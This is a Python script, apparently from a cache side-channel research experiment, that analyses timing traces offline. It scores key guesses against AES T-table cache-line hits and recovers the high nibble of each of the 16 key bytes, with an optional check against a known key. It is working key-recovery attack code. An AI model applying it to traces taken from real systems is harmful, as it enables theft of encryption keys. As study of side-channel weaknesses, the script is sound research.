#!/usr/bin/env python3
"""离线分析 Version A 的原始 CSV。

本脚本不属于 attacker 运行路径，运行实验时不会执行。
紧凑型 T-table 的 cache-line 观测只能恢复每个 key byte 的高 4 bit，
因此这里输出 high-nibble 结果和每个字节的 16 个完整候选值。
"""

import argparse
import csv
from pathlib import Path


def parse_key(text: str) -> bytes:
    text = text.replace(" ", "").replace(":", "")
    if text.startswith("0x"):
        text = text[2:]
    if len(text) != 32:
        raise ValueError("true key must contain exactly 32 hexadecimal characters")
    return bytes.fromhex(text)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--csv", required=True, help="raw trace_timings.csv")
    ap.add_argument("--threshold", type=int, required=True,
                    help="offline-selected hit threshold in TSC ticks")
    ap.add_argument("--out", default="recovery_high_nibbles.csv")
    ap.add_argument("--true-key", help="optional 32-hex-byte key for offline validation")
    args = ap.parse_args()

    scores = [[0] * 256 for _ in range(16)]
    trace_count = 0

    with open(args.csv, newline="", encoding="utf-8") as fp:
        reader = csv.DictReader(fp)
        for row in reader:
            trace_count += 1
            for byte_id in range(16):
                table_id = byte_id & 3
                pt = int(row[f"pt{byte_id:02d}"], 16)
                for guess in range(256):
                    line_id = ((pt ^ guess) >> 4)
                    ticks = int(row[f"te{table_id}_line{line_id:02d}_ticks"])
                    if ticks < args.threshold:
                        scores[byte_id][guess] += 1

    true_key = parse_key(args.true_key) if args.true_key else None
    out_path = Path(args.out)
    with out_path.open("w", newline="", encoding="utf-8") as fp:
        writer = csv.writer(fp)
        writer.writerow([
            "byte", "table", "best_guess", "recovered_high_nibble",
            "best_score", "trace_count", "true_high_nibble", "high_nibble_ok",
            "full_byte_candidates"
        ])

        print(f"trace_count={trace_count}")
        print(f"threshold={args.threshold} ticks")
        print("compact T-table result: only high nibble is observable")

        for byte_id in range(16):
            best_guess = max(range(256), key=lambda g: scores[byte_id][g])
            high = best_guess & 0xF0
            candidates = [f"{high | low:02x}" for low in range(16)]
            true_high = ""
            high_ok = ""
            if true_key is not None:
                true_high = f"{true_key[byte_id] & 0xF0:02x}"
                high_ok = str(high == (true_key[byte_id] & 0xF0))

            writer.writerow([
                byte_id, byte_id & 3, f"{best_guess:02x}", f"{high:02x}",
                scores[byte_id][best_guess], trace_count, true_high, high_ok,
                " ".join(candidates)
            ])
            print(
                f"byte[{byte_id:02d}] table=Te{byte_id & 3} "
                f"high=0x{high >> 4:x} score={scores[byte_id][best_guess]}/{trace_count} "
                f"candidates={' '.join(candidates)}"
            )

    print(f"saved={out_path}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
